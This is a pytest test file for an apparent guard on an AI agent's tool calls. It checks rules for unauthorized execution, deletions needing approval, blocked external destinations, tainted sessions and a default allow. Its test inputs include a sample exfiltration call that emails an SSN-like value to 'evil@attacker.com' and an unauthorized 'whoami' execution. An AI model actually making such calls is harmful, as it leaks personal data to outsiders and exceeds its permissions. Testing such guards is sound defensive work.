import pytest
from shared.schemas import Session, ToolCall
from guard.core import decide

@pytest.fixture
def clean_session():
    return Session(
        id="test_sess_01",
        started_at="2026-10-23T00:00:00Z",
        guard_mode="guard_on",
        task="Test task",
        tainted=False,
        highest_sensitivity="public",
        history=[]
    )

def test_rule_1_permission_denied(clean_session):
    call = ToolCall(tool="unauthorized_exec", args={"cmd": "whoami"})
    verdict = decide(call, clean_session)
    assert verdict.action == "BLOCK"
    assert verdict.rule_id == "permission_denied"

def test_rule_2_always_approve(clean_session):
    call = ToolCall(tool="delete_file", args={"name": "test.txt"})
    verdict = decide(call, clean_session)
    assert verdict.action == "NEEDS_APPROVAL"
    assert verdict.rule_id == "always_approve"

def test_rule_3_destination_not_allowed(clean_session):
    call = ToolCall(tool="send_email", args={"to": "someone@external.com", "subject": "Hi", "body": "Clean text"})
    verdict = decide(call, clean_session)
    assert verdict.action == "BLOCK"
    assert verdict.rule_id == "destination_not_allowed"

def test_rule_3_leak_to_external(clean_session):
    call = ToolCall(tool="send_email", args={"to": "evil@attacker.com", "subject": "Leak", "body": "SSN is 999-12-3456"})
    verdict = decide(call, clean_session)
    assert verdict.action == "BLOCK"
    assert verdict.rule_id == "leak_to_external"

def test_rule_4_leak_while_tainted(clean_session):
    clean_session.tainted = True
    call = ToolCall(tool="send_email", args={"to": "alice@acme.com", "subject": "Internal", "body": "SSN is 999-12-3456"})
    verdict = decide(call, clean_session)
    assert verdict.action == "BLOCK"
    assert verdict.rule_id == "leak_while_tainted"

def test_rule_5_untrusted_influence_on_sink(clean_session):
    clean_session.tainted = True
    clean_session.highest_sensitivity = "confidential"
    call = ToolCall(tool="send_email", args={"to": "alice@acme.com", "subject": "Summary", "body": "Routine report without matches"})
    verdict = decide(call, clean_session)
    assert verdict.action == "NEEDS_APPROVAL"
    assert verdict.rule_id == "untrusted_influence_on_sink"

def test_rule_6_default_allow(clean_session):
    call = ToolCall(tool="send_email", args={"to": "alice@acme.com", "subject": "Routine", "body": "Routine clean body"})
    verdict = decide(call, clean_session)
    assert verdict.action == "ALLOW"
    assert verdict.rule_id == "default_allow"
